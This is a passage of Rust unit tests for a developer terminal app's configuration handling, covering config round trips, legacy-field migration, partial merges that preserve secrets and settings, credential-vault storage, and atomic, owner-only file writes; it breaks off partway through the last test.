// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    /// Helper: run load/save with a temp directory to avoid touching real config.
    /// We override config_dir by writing directly to a temp path and reading back.
    fn round_trip_in_dir<T: Serialize + DeserializeOwned + Default>(
        dir: &std::path::Path,
        filename: &str,
        value: &T,
    ) -> T {
        let path = dir.join(filename);
        let json = serde_json::to_string_pretty(value).unwrap();
        fs::write(&path, json).unwrap();
        let read_back: T = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        read_back
    }

    // GH #107 — notes must never fall back to Default on a broken file, or the frontend
    // hydrates empty and the next mutation atomically overwrites the real notes.
    #[test]
    fn strict_load_returns_default_for_a_missing_file() {
        let dir = TempDir::new().expect("temp dir");
        let loaded =
            load_json_config_strict_from_path::<serde_json::Value>(&dir.path().join("notes.json"));
        assert_eq!(loaded, Ok(serde_json::Value::Null));
    }

    #[test]
    fn strict_load_errors_and_preserves_a_corrupt_file() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");
        fs::write(&path, "{ this is not json").unwrap();

        let loaded = load_json_config_strict_from_path::<serde_json::Value>(&path);
        assert!(loaded.is_err(), "corrupt file must not load as Default");
        assert!(!path.exists(), "corrupt file must be moved aside");

        let preserved: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| e.file_name().to_string_lossy().contains("corrupt-"))
            .collect();
        assert_eq!(preserved.len(), 1, "exactly one file kept aside");
        assert_eq!(
            fs::read_to_string(preserved[0].path()).unwrap(),
            "{ this is not json"
        );
    }

    #[test]
    fn strict_load_reads_a_valid_file() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");
        fs::write(&path, r#"{"notes":[{"id":"n1"}]}"#).unwrap();

        let loaded = load_json_config_strict_from_path::<serde_json::Value>(&path)
            .expect("valid file loads");
        assert_eq!(loaded["notes"][0]["id"], "n1");
        assert!(path.exists(), "a valid file is left where it is");
    }

    #[test]
    fn app_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = AppConfig {
            shell: Some("/bin/zsh".to_string()),
            font_family: "Fira Code".to_string(),
            font_size: 16,
            font_weight: 200,
            theme: "dark".to_string(),
            mcp_server_enabled: true,
            mcp_port: 4000,
            mcp_config_installed: false,
            ide: "cursor".to_string(),
            default_font_size: 18,
            services: ServicesConfig {
                server: ServerConfig {
                    enabled: true,
                    port: 8080,
                    ipv6_enabled: true,
                },
                auth: AuthConfig {
                    username: "admin".to_string(),
                    password_hash: "$2b$12$hash".to_string(),
                    session_token: "test-session-token".to_string(),
                    session_token_duration_secs: 3600,
                    lan_auth_bypass: true,
                    ..Default::default()
                },
                tls: TlsConfig::default(),
                relay: RelayConfig::default(),
                push: PushConfig {
                    vapid_subject: "mailto:test@example.com".to_string(),
                    ..PushConfig::default()
                },
            },
            confirm_before_quit: false,
            confirm_before_closing_tab: true,
            max_tab_name_length: 40,
            split_tab_mode: SplitTabMode::Unified,
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            tab_cycling_all_types: true,
            tab_tree_enabled: true,
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: true,
            auto_update_enabled: false,
            language: "it".to_string(),
            disabled_plugin_ids: vec!["test-disabled".to_string()],
            update_channel: "nightly".to_string(),
            disabled_agents: vec!["codex".to_string()],
            disabled_mcp_agents: vec!["windsurf".to_string()],
            disabled_native_tools: vec!["plugin_dev_guide".to_string()],
            intent_tab_title: false,
            suggest_followups: false,
            global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
            copy_on_select: true,
            osc52_clipboard: true,
            show_last_prompt: false,
            bell_style: "visual".to_string(),
            collapse_tools: true,
            issue_filter: "assigned".to_string(),
            experimental_features_enabled: false,
            ai_chat_enabled: false,
            ai_triage_enabled: false,
            ai_watchers_enabled: false,
            scrollback_reflow: false,
            ai_terminal_mcp_enabled: false,
            index_strategy: "active_and_switch".to_string(),
            cursor_style: "bar".to_string(),
            terminal_renderer: "webgl".to_string(),
            auto_update_plugins_enabled: false,
            standby_timeout_minutes: 5,
            custom_launchers: Vec::new(),
            inline_blame_enabled: true,
        };
        let loaded: AppConfig = round_trip_in_dir(dir.path(), "config.json", &cfg);
        assert_eq!(loaded.shell.as_deref(), Some("/bin/zsh"));
        assert_eq!(loaded.font_size, 16);
        assert_eq!(loaded.ide, "cursor");
        assert_eq!(loaded.default_font_size, 18);
        assert!(loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 4000);
        assert!(loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 8080);
        assert_eq!(loaded.services.auth.username, "admin");
        assert_eq!(loaded.services.auth.password_hash, "$2b$12$hash");
        assert!(!loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 40);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Unified);
        assert!(loaded.prevent_sleep_when_busy);
        assert!(!loaded.auto_update_enabled);
        assert_eq!(loaded.language, "it");
        assert_eq!(
            loaded.disabled_plugin_ids,
            vec!["test-disabled".to_string()]
        );
        assert_eq!(loaded.update_channel, "nightly");
        assert_eq!(loaded.services.auth.session_token_duration_secs, 3600);
        assert!(loaded.services.server.ipv6_enabled);
        assert!(loaded.services.auth.lan_auth_bypass);
        assert_eq!(
            loaded.disabled_native_tools,
            vec!["plugin_dev_guide".to_string()]
        );
        assert!(!loaded.intent_tab_title);
        assert!(!loaded.suggest_followups);
    }

    #[test]
    fn app_config_serde_default_for_new_fields() {
        // Simulate a config.json from before ide/default_font_size existed
        let dir = TempDir::new().unwrap();
        let old_json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null}"#;
        let path = dir.path().join("config.json");
        fs::write(&path, old_json).unwrap();
        let loaded: AppConfig = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(loaded.ide, "");
        assert_eq!(loaded.default_font_size, 13);
        assert!(!loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 3845);
        assert!(!loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 9876);
        assert_eq!(loaded.services.auth.username, "");
        assert_eq!(loaded.services.auth.password_hash, "");
        assert!(loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 25);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Separate);
        assert!(!loaded.prevent_sleep_when_busy);
        assert!(loaded.auto_update_enabled);
        assert_eq!(loaded.language, "en");
        assert_eq!(loaded.update_channel, "stable");
        assert_eq!(loaded.services.auth.session_token_duration_secs, 86400);
        assert!(!loaded.services.server.ipv6_enabled);
        assert!(!loaded.services.auth.lan_auth_bypass);
        assert!(loaded.intent_tab_title); // defaults to true
        assert!(loaded.suggest_followups); // defaults to true
        assert!(!loaded.experimental_features_enabled);
    }

    #[test]
    fn migrate_flat_services_fields() {
        let old_json = r#"{
            "shell": null,
            "font_family": "JetBrains Mono",
            "font_size": 14,
            "theme": "vscode-dark",
            "remote_access_enabled": true,
            "remote_access_port": 8080,
            "remote_access_username": "admin",
            "remote_access_password_hash": "$2b$12$hash",
            "session_token": "tok-123",
            "session_token_duration_secs": 7200,
            "ipv6_enabled": true,
            "lan_auth_bypass": true,
            "relay_enabled": true,
            "relay_url": "wss://relay.example.com",
            "relay_token": "secret",
            "relay_session_id": "sess-1",
            "push_enabled": true,
            "vapid_private_key": "pk",
            "vapid_public_key": "pub",
            "vapid_subject": "mailto:test@example.com"
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(old_json).unwrap();
        migrate_flat_services(&mut val);
        let cfg: AppConfig = serde_json::from_value(val).unwrap();
        assert!(cfg.services.server.enabled);
        assert_eq!(cfg.services.server.port, 8080);
        assert!(cfg.services.server.ipv6_enabled);
        assert_eq!(cfg.services.auth.username, "admin");
        assert_eq!(cfg.services.auth.password_hash, "$2b$12$hash");
        assert_eq!(cfg.services.auth.session_token, "tok-123");
        assert_eq!(cfg.services.auth.session_token_duration_secs, 7200);
        assert!(cfg.services.auth.lan_auth_bypass);
        assert!(cfg.services.relay.enabled);
        assert_eq!(cfg.services.relay.url, "wss://relay.example.com");
        assert_eq!(cfg.services.relay.token, "secret");
        assert_eq!(cfg.services.relay.session_id, "sess-1");
        assert!(cfg.services.push.enabled);
        assert_eq!(cfg.services.push.vapid_private_key, "pk");
        assert_eq!(cfg.services.push.vapid_public_key, "pub");
        assert_eq!(cfg.services.push.vapid_subject, "mailto:test@example.com");
        // Flat fields should be removed after migration
        assert_eq!(cfg.font_family, "JetBrains Mono");
    }

    #[test]
    fn merge_partial_keeps_remote_access_enabled() {
        // The bug: `PUT /config` and the MCP `config` save deserialized a partial
        // body straight into an AppConfig, so `services.server.enabled` fell back
        // to its `false` default and remote access silently died on disk while the
        // bound listener kept serving.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;
        current.services.server.port = 9876;

        let merged = merge_partial_app_config(&current, serde_json::json!({ "font_size": 18 }))
            .expect("partial payload must merge");

        assert!(
            merged.services.server.enabled,
            "a payload that never mentions remote access must not switch it off"
        );
        assert_eq!(merged.services.server.port, 9876);
        assert_eq!(merged.font_size, 18);
    }

    #[test]
    fn merge_partial_honors_an_explicit_disable() {
        // Preserving omitted fields must not make the setting unwritable: a caller
        // that does mention it still wins.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;

        let merged = merge_partial_app_config(
            &current,
            serde_json::json!({ "services": { "server": { "enabled": false } } }),
        )
        .expect("explicit disable must merge");

        assert!(!merged.services.server.enabled);
    }

    #[test]
    fn merge_partial_merges_siblings_and_replaces_lists() {
        // Objects merge key by key, so touching one field under `services.server`
        // leaves its siblings alone; arrays replace wholesale so a caller can
        // still clear a list by sending an empty one.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;
        current.services.server.ipv6_enabled = true;
        current.disabled_plugin_ids = vec!["one".to_string(), "two".to_string()];

        let merged = merge_partial_app_config(
            &current,
            serde_json::json!({
                "services": { "server": { "port": 9999 } },
                "disabled_plugin_ids": []
            }),
        )
        .expect("sibling merge must succeed");

        assert_eq!(merged.services.server.port, 9999);
        assert!(merged.services.server.enabled, "sibling must survive");
        assert!(merged.services.server.ipv6_enabled, "sibling must survive");
        assert!(
            merged.disabled_plugin_ids.is_empty(),
            "list must be cleared"
        );
    }

    #[test]
    fn merge_partial_rejects_a_type_mismatch() {
        let current = AppConfig::default();
        assert!(
            merge_partial_app_config(&current, serde_json::json!({ "font_size": "big" })).is_err(),
            "a wrongly-typed field must fail loudly, not silently default"
        );
    }

    #[test]
    fn server_settings_changed_covers_every_rebind_trigger() {
        let base = AppConfig::default();
        assert!(!server_settings_changed(&base, &base.clone()));

        for mutate in [
            (|c: &mut AppConfig| c.services.server.enabled = true) as fn(&mut AppConfig),
            |c: &mut AppConfig| c.services.server.port = 1234,
            |c: &mut AppConfig| c.services.server.ipv6_enabled = true,
            |c: &mut AppConfig| c.services.auth.username = "admin".to_string(),
            |c: &mut AppConfig| c.services.auth.password_hash = "hash".to_string(),
        ] {
            let mut changed = base.clone();
            mutate(&mut changed);
            assert!(
                server_settings_changed(&base, &changed),
                "every listener-affecting field must trigger a rebind"
            );
        }
    }

    #[test]
    fn migrate_skips_when_services_present() {
        let nested_json = r#"{
            "services": {
                "server": { "enabled": true, "port": 9999, "ipv6_enabled": false },
                "auth": { "username": "user2" },
                "tls": {},
                "relay": {},
                "push": {}
            },
            "remote_access_enabled": false
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(nested_json).unwrap();
        migrate_flat_services(&mut val);
        // `services` already present → migration is a no-op, flat field kept as-is
        let services = val.pointer("/services/server/enabled").unwrap();
        assert_eq!(services, true);
        let port = val.pointer("/services/server/port").unwrap();
        assert_eq!(port, 9999);
        let username = val.pointer("/services/auth/username").unwrap();
        assert_eq!(username, "user2");
        // flat field NOT consumed (migration skipped)
        assert!(val.get("remote_access_enabled").is_some());
    }

    #[test]
    #[serial_test::serial]
    fn app_config_secrets_roundtrip_through_credential_vault() {
        let tmp = TempDir::new().unwrap();
        let _guard = set_config_dir_override(tmp.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RemoteSessionToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::PushVapidPrivateKey);

        let mut cfg = AppConfig::default();
        cfg.services.auth.session_token = "session-secret".to_string();
        cfg.services.relay.token = "relay-secret".to_string();
        cfg.services.push.vapid_private_key = "vapid-secret".to_string();
        cfg.services.push.vapid_public_key = "vapid-public".to_string();

        save_app_config(cfg).unwrap();

        let disk: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(tmp.path().join("config.json")).unwrap())
                .unwrap();
        assert!(disk.pointer("/services/auth/session_token").is_none());
        assert_eq!(
            disk.pointer("/services/auth/session_token_exists"),
            Some(&serde_json::Value::Bool(true))
        );
        assert!(disk.pointer("/services/relay/token").is_none());
        assert_eq!(
            disk.pointer("/services/relay/token_exists"),
            Some(&serde_json::Value::Bool(true))
        );
        assert!(disk.pointer("/services/push/vapid_private_key").is_none());
        assert_eq!(
            disk.pointer("/services/push/vapid_private_key_exists"),
            Some(&serde_json::Value::Bool(true))
        );

        let loaded = load_app_config();
        assert_eq!(loaded.services.auth.session_token, "session-secret");
        assert!(loaded.services.auth.session_token_exists);
        assert_eq!(loaded.services.relay.token, "relay-secret");
        assert_eq!(loaded.services.relay.token_exists, Some(true));
        assert_eq!(loaded.services.push.vapid_private_key, "vapid-secret");
        assert!(loaded.services.push.vapid_private_key_exists);
    }

    #[test]
    fn relay_token_exists_omitted_in_json_deserializes_to_none() {
        // Sanity-check the serde attribute itself: a JSON object that never
        // mentions "token_exists" must deserialize to `None`, not `Some(false)`.
        let relay: RelayConfig = serde_json::from_str(
            r#"{"enabled": true, "url": "wss://relay.example.com", "session_id": "abc"}"#,
        )
        .unwrap();
        assert_eq!(relay.token_exists, None);
    }

    #[test]
    fn preserve_redacted_secrets_keeps_relay_token_when_payload_omits_exists_flag() {
        // DATA-1 regression test: an agent MCP `config/save` (or partial PUT
        // /config) that never mentions `relay.token_exists` must NOT delete the
        // stored relay token. Before the fix, `token_exists` was a plain `bool`
        // that defaulted to `false` on omission, which the old guard read as an
        // explicit "no token exists" signal and wiped the stored token.
        let mut current = AppConfig::default();
        current.services.relay.token = "existing-secret".to_string();
        current.services.relay.token_exists = Some(true);

        // Simulate a partial payload: caller only touched an unrelated field,
        // so relay.token / relay.token_exists come back at their JSON defaults
        // (empty string / None) exactly as `#[serde(default)]` would produce
        // for a JSON object that omits both keys.
        let mut incoming = AppConfig::default();
        assert_eq!(incoming.services.relay.token_exists, None);
        assert!(incoming.services.relay.token.is_empty());

        preserve_redacted_app_config_secrets(&mut incoming, &current);

        assert_eq!(incoming.services.relay.token, "existing-secret");
        assert_eq!(incoming.services.relay.token_exists, Some(true));
    }

    #[test]
    fn preserve_redacted_secrets_honors_explicit_relay_token_clear() {
        // The explicit-clear affordance (ServicesTab.tsx sets
        // `token_exists = v.length > 0` on every keystroke of the bearer-token
        // input) must keep working: an incoming payload that explicitly says
        // `token_exists: false` alongside an empty token means "the user
        // cleared this field" and must NOT be restored from `current`.
        let mut current = AppConfig::default();
        current.services.relay.token = "existing-secret".to_string();
        current.services.relay.token_exists = Some(true);

        let mut incoming = AppConfig::default();
        incoming.services.relay.token_exists = Some(false);
        assert!(incoming.services.relay.token.is_empty());

        preserve_redacted_app_config_secrets(&mut incoming, &current);

        assert!(incoming.services.relay.token.is_empty());
        assert_eq!(incoming.services.relay.token_exists, Some(false));
    }

    #[test]
    fn tls_config_serde_variants() {
        // Off variant
        let off: TlsConfig = serde_json::from_str(r#"{"mode":"off"}"#).unwrap();
        assert!(matches!(off, TlsConfig::Off));

        // Empty object → Off (backward compat)
        let empty: TlsConfig = serde_json::from_str(r#"{}"#).unwrap();
        assert!(matches!(empty, TlsConfig::Off));

        // Manual variant
        let manual: TlsConfig = serde_json::from_str(
            r#"{"mode":"manual","cert_path":"/etc/cert.pem","key_path":"/etc/key.pem"}"#,
        )
        .unwrap();
        match manual {
            TlsConfig::Manual {
                cert_path,
                key_path,
            } => {
                assert_eq!(cert_path, "/etc/cert.pem");
                assert_eq!(key_path, "/etc/key.pem");
            }
            _ => panic!("expected Manual variant"),
        }

        // Round-trip Manual
        let json = serde_json::to_string(&TlsConfig::Manual {
            cert_path: "/a.pem".into(),
            key_path: "/b.pem".into(),
        })
        .unwrap();
        let rt: TlsConfig = serde_json::from_str(&json).unwrap();
        assert!(matches!(rt, TlsConfig::Manual { .. }));
    }

    #[test]
    fn notification_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = NotificationConfig {
            enabled: false,
            volume: 0.8,
            sounds: NotificationSounds {
                question: true,
                error: false,
                completion: true,
                warning: false,
                info: true,
                attention: false,
            },
            audio_device: Some("Test Speaker".to_string()),
            silence_remote_completions: true,
            toasts_in_bell: false,
        };
        let loaded: NotificationConfig = round_trip_in_dir(dir.path(), "notifications.json", &cfg);
        assert!(!loaded.enabled);
        assert!((loaded.volume - 0.8).abs() < f64::EPSILON);
        assert!(loaded.sounds.question);
        assert!(!loaded.sounds.error);
        assert!(!loaded.sounds.attention);
        assert_eq!(loaded.audio_device.as_deref(), Some("Test Speaker"));
        assert!(loaded.silence_remote_completions);
        assert!(!loaded.toasts_in_bell);
    }

    /// A user who never saw the setting keeps the mirroring, so nothing a toast
    /// said is lost. An explicit opt-out survives the round trip.
    #[test]
    fn toasts_in_bell_defaults_on() {
        assert!(NotificationConfig::default().toasts_in_bell);
        let legacy: NotificationConfig =
            serde_json::from_str(r#"{"enabled":true,"volume":0.5}"#).unwrap();
        assert!(legacy.toasts_in_bell);
        let opted_out: NotificationConfig =
            serde_json::from_str(r#"{"toasts_in_bell":false}"#).unwrap();
        assert!(!opted_out.toasts_in_bell);
    }

    /// Orchestrations spawn many workers; a chime per finished worker is noise, so
    /// silencing them is the default. Both the struct default and an older config
    /// file written before the field existed must land on `true`.
    #[test]
    fn silence_remote_completions_defaults_on() {
        assert!(NotificationConfig::default().silence_remote_completions);
        let legacy: NotificationConfig =
            serde_json::from_str(r#"{"enabled":true,"volume":0.5}"#).unwrap();
        assert!(legacy.silence_remote_completions);
        // An explicit opt-out still wins — the default must not overwrite a choice.
        let opted_out: NotificationConfig =
            serde_json::from_str(r#"{"silence_remote_completions":false}"#).unwrap();
        assert!(!opted_out.silence_remote_completions);
    }

    #[test]
    fn ui_prefs_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = UIPrefsConfig {
            sidebar_visible: false,
            sidebar_width: 300,
            diff_panel_visible: true,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: true,
            plan_panel_visible: false,
            git_panel_visible: false,
            diff_panel_width: 500,
            markdown_panel_width: 450,
            notes_panel_width: 320,
            plan_panel_width: 350,
            git_panel_width: 380,
            settings_nav_width: 200,
            diff_view_mode: "split".to_string(),
            detached_panels: std::collections::HashMap::from([(
                "activity".to_string(),
                "panel-activity".to_string(),
            )]),
            github_section_collapsed: std::collections::HashMap::from([
                ("issues".to_string(), true),
                ("prs".to_string(), false),
            ]),
        };
        let loaded: UIPrefsConfig = round_trip_in_dir(dir.path(), "ui-prefs.json", &cfg);
        assert!(!loaded.sidebar_visible);
        assert_eq!(loaded.sidebar_width, 300);
        assert_eq!(loaded.diff_panel_width, 500);
        assert_eq!(loaded.markdown_panel_width, 450);
        assert_eq!(
            loaded.detached_panels.get("activity").map(|s| s.as_str()),
            Some("panel-activity")
        );
        assert_eq!(loaded.notes_panel_width, 320);
        assert_eq!(loaded.settings_nav_width, 200);
        assert_eq!(loaded.diff_view_mode, "split");
        assert_eq!(loaded.github_section_collapsed.get("issues"), Some(&true));
        assert_eq!(loaded.github_section_collapsed.get("prs"), Some(&false));
    }

    /// A prefs file written before the field existed must still load, with the
    /// map empty so every section falls back to its own default.
    #[test]
    fn ui_prefs_without_github_section_collapsed_defaults_to_empty() {
        let loaded: UIPrefsConfig = serde_json::from_str(r#"{"sidebar_visible":true}"#).unwrap();
        assert!(loaded.github_section_collapsed.is_empty());
    }

    #[test]
    fn repo_settings_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                display_name: "my-repo".to_string(),
                auto_consolidate_worktrees: true,
                base_branch: Some("main".to_string()),
                copy_ignored_files: Some(true),
                copy_untracked_files: None,
                setup_script: Some("npm install".to_string()),
                run_script: Some("npm start".to_string()),
                archive_script: Some("cleanup.sh".to_string()),
                color: String::new(),
                worktree_storage: None,
                prompt_on_create: None,
                prompt_on_worktree_switch: None,
                delete_branch_on_remove: None,
                auto_archive_merged: None,
                orphan_cleanup: None,
                pr_merge_strategy: None,
                after_merge: None,
                auto_fetch_interval_minutes: None,
                auto_delete_on_pr_close: None,
                mcp_upstreams: None,
                branch_labels: HashMap::new(),
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        assert_eq!(loaded.repos.len(), 1);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.display_name, "my-repo");
        assert_eq!(entry.base_branch, Some("main".to_string()));
        assert_eq!(entry.copy_ignored_files, Some(true));
        assert_eq!(entry.copy_untracked_files, None);
        assert_eq!(entry.archive_script, Some("cleanup.sh".to_string()));
        // The frontend owns several repo fields that never reached this struct and
        // are therefore dropped on every save; consolidation must not join them.
        assert!(entry.auto_consolidate_worktrees);
    }

    #[test]
    fn prompt_library_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = PromptLibraryConfig {
            prompts: vec![PromptEntry {
                id: "abc".to_string(),
                label: "Test prompt".to_string(),
                text: "Hello world".to_string(),
                pinned: true,
            }],
        };
        let loaded: PromptLibraryConfig =
            round_trip_in_dir(dir.path(), "prompt-library.json", &cfg);
        assert_eq!(loaded.prompts.len(), 1);
        assert_eq!(loaded.prompts[0].id, "abc");
        assert!(loaded.prompts[0].pinned);
    }

    #[test]
    fn ai_prompts_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = AiPromptsConfig {
            diff_triage_system_prompt: Some("Custom triage prompt".to_string()),
        };
        let loaded: AiPromptsConfig = round_trip_in_dir(dir.path(), "ai-prompts.json", &cfg);
        assert_eq!(
            loaded.diff_triage_system_prompt.as_deref(),
            Some("Custom triage prompt")
        );
    }

    #[test]
    fn ai_prompts_empty_file_returns_default() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join("ai-prompts.json"), "{}").unwrap();
        let loaded: AiPromptsConfig =
            round_trip_in_dir(dir.path(), "ai-prompts.json", &AiPromptsConfig::default());
        assert!(loaded.diff_triage_system_prompt.is_none());
    }

    #[test]
    fn missing_file_returns_default() {
        // load_json_config with a nonexistent file returns default
        let cfg: NotificationConfig = load_json_config("nonexistent-12345.json");
        assert!(cfg.enabled); // default is true
    }

    #[test]
    fn save_json_config_is_atomic() {
        let dir = TempDir::new().unwrap();
        let filename = "atomic-test.json";
        let target = dir.path().join(filename);

        // Write initial content
        let initial = NotificationConfig {
            enabled: false,
            ..NotificationConfig::default()
        };
        let json = serde_json::to_string_pretty(&initial).unwrap();
        fs::write(&target, json).unwrap();

        // Overwrite with new content using save_json_config pattern
        let updated = NotificationConfig {
            enabled: true,
            ..NotificationConfig::default()
        };
        let json2 = serde_json::to_string_pretty(&updated).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json2).unwrap();
        fs::rename(&temp, &target).unwrap();

        // Verify the new content is there
        let loaded: NotificationConfig =
            serde_json::from_str(&fs::read_to_string(&target).unwrap()).unwrap();
        assert!(loaded.enabled);

        // Verify no temp file remains
        assert!(!temp.exists());
    }

    #[test]
    fn persist_atomic_survives_concurrent_writers() {
        use std::sync::Arc;
        use std::thread;

        let dir = TempDir::new().unwrap();
        let target = Arc::new(dir.path().join("concurrent.bin"));

        // Eight writers hammer the SAME target with distinct homogeneous payloads.
        // With a per-call unique temp name no two writers ever share a temp path,
        // so every rename atomically installs a fully-written payload. A per-process
        // temp name (the old bug) would make the writers collide: one truncates the
        // temp while another renames it, yielding a truncated/interleaved file or a
        // rename error (panics the thread).
        let payloads: Vec<Vec<u8>> = (0..8u8).map(|i| vec![b'A' + i; 4096]).collect();
        let mut handles = Vec::new();
        for p in payloads.clone() {
            let target = Arc::clone(&target);
            handles.push(thread::spawn(move || {
                for _ in 0..40 {
                    persist_atomic(&target, &p).unwrap();
                }
            }));
        }
        for h in handles {
            h.join().unwrap();
        }

        // The final file must be exactly one writer's full, homogeneous payload.
        let content = fs::read(&*target).unwrap();
        assert_eq!(content.len(), 4096, "file truncated → temp-name collision");
        let byte = content[0];
        assert!(
            payloads.iter().any(|p| p[0] == byte),
            "file byte {byte} matches no writer"
        );
        assert!(
            content.iter().all(|&b| b == byte),
            "interleaved content → concurrent-write race"
        );

        // No temp files left behind by any writer.
        let leftovers: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().contains("tmp."))
            .collect();
        assert!(leftovers.is_empty(), "temp files leaked: {leftovers:?}");
    }

    #[cfg(unix)]
    #[test]
    fn save_json_config_sets_restrictive_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let dir = TempDir::new().unwrap();
        let filename = "perms-test.json";
        let target = dir.path().join(filename);

        let cfg = NotificationConfig::default();
        let json = serde_json::to_string_pretty(&cfg).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json).unwrap();

        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(&temp, perms).unwrap();
        fs::rename(&temp, &target).unwrap();

        let metadata = fs::metadata(&target).unwrap();
        let mode = metadata.permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "Config file should be owner-only (0600)");
    }

    #[test]
    fn has_custom_settings_true_when_base_branch_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("main".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_ignored_files() {
        let entry = RepoSettingsEntry {
            copy_ignored_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_untracked_files() {
        let entry = RepoSettingsEntry {
            copy_untracked_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_setup_script_set() {
        let entry = RepoSettingsEntry {
            setup_script: Some("npm install".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_run_script_set() {
        let entry = RepoSettingsEntry {
            run_script: Some("npm start".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_archive_script_set() {
        let entry = RepoSettingsEntry {
            archive_script: Some("cleanup.sh".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_color_set() {
        let entry = RepoSettingsEntry {
            color: "#ff0000".to_string(),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_multiple_fields_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            setup_script: Some("make build".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn invalid_split_tab_mode_fails_deserialization() {
        // An invalid split_tab_mode value should cause deserialization to fail,
        // which load_json_config handles by returning Default
        let json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null,"split_tab_mode":"bogus"}"#;
        let result: Result<AppConfig, _> = serde_json::from_str(json);
        assert!(
            result.is_err(),
            "Invalid split_tab_mode should fail deserialization"
        );
    }

    #[test]
    fn split_tab_mode_serializes_as_lowercase() {
        let cfg = AppConfig {
            split_tab_mode: SplitTabMode::Unified,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""split_tab_mode":"unified""#));

        let cfg2 = AppConfig::default();
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""split_tab_mode":"separate""#));
    }

    #[test]
    fn tab_ordering_mode_serializes_as_kebab_case() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""tab_ordering_mode":"terminals-first""#));

        let cfg2 = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""tab_ordering_mode":"free""#));

        let cfg3 = AppConfig::default();
        let json3 = serde_json::to_string(&cfg3).unwrap();
        assert!(json3.contains(r#""tab_ordering_mode":"grouped-by-type""#));
    }

    #[test]
    fn tab_ordering_mode_round_trip() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        let loaded: AppConfig = serde_json::from_str(&json).unwrap();
